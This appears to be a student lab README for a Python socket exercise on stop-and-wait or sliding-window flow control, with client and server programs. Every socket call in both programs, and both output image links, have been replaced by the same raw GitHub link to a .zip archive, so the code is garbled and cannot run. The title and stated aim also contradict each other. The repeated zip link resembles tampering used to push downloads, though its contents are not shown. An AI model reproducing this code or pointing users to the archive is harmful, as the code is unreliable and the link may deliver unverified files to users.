# EX-2 IMPLEMENTATION OF STOP AND WAIT PROTOCOL

# DATE: 13-03-2023

# AIM :
## To write a python program to perform sliding window protocol


# ALGORITHM :
## 1. Start the program.
## 2. Get the frame size from the user
## 3. To create the frame based on the user request.
## 4. To send frames to server from the client side.
## 5. If your frames reach the server it will send ACK signal to client otherwise it will sendNACK signal to client.

## 6. Stop the program

# CLIENT PROGRAM :
```PYTHON 3 
## Developed : SHAIK MUFEEZ
## Reg no : 212221043007
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(('localhost',8000))
https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(5)
c,https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip()
size=int(input("Enter number of frames to send:"))
l=list(range(size))
s=int(input("Enter Window Size:"))
st=0
i=0
while True:
	while(i<len(l)):
		st+=s
		https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(str(l[i:st]).encode())
		https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(1024).decode()
		if ack:
			print(ack)
			i+=s

```
# SERVER PROGRAM :
```PYTHON 3
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(('localhost',8000))
while True:
	print(https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip(1024).decode())
	https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip("acknowledgement recieved from the server".encode())
```


# SERVER OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip)
# CLIENT OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-2/main/EX-2-main.zip)



# RESULT :
## Thus, python program to perform stop and wait protocol was successfully executed.



